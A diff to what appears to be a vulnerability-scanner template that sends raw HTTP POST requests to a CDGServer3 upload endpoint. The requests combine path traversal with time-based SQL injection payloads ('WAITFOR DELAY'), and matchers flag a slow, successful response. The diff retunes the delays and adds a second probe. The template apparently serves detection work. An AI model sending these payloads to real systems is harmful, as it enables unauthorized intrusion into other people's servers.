@@ -13,15 +13,26 @@ Host: {{Hostname}}
 User-Agent: {{random_ua}}
 Content-Type: application/x-www-form-urlencoded
 
-id=1';WAITFOR+DELAY+'0:0:7'--
+id=1';WAITFOR+DELAY+'0:0:5'--
 
 #@ timeout: 20
 #@ condition: and
+#@ matcher: response_time >= 5
 #@ matcher: status_code == 200
-#@ matcher: response_time > 7
+
+---
+
+POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+id=1';WAITFOR+DELAY+'0:0:8'--
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 8
+#@ matcher: status_code == 200
 
 
-
-
-
-# @VEIL-STAMP: af981b707612ded4689465c600cd25546db8e9ba070bdebaa9c98bad920ca88b
+# @VEIL-STAMP: 7f005b8442232763680eccef8ac5f7539e7a991676ad9f8eae1a1e670ab444dd
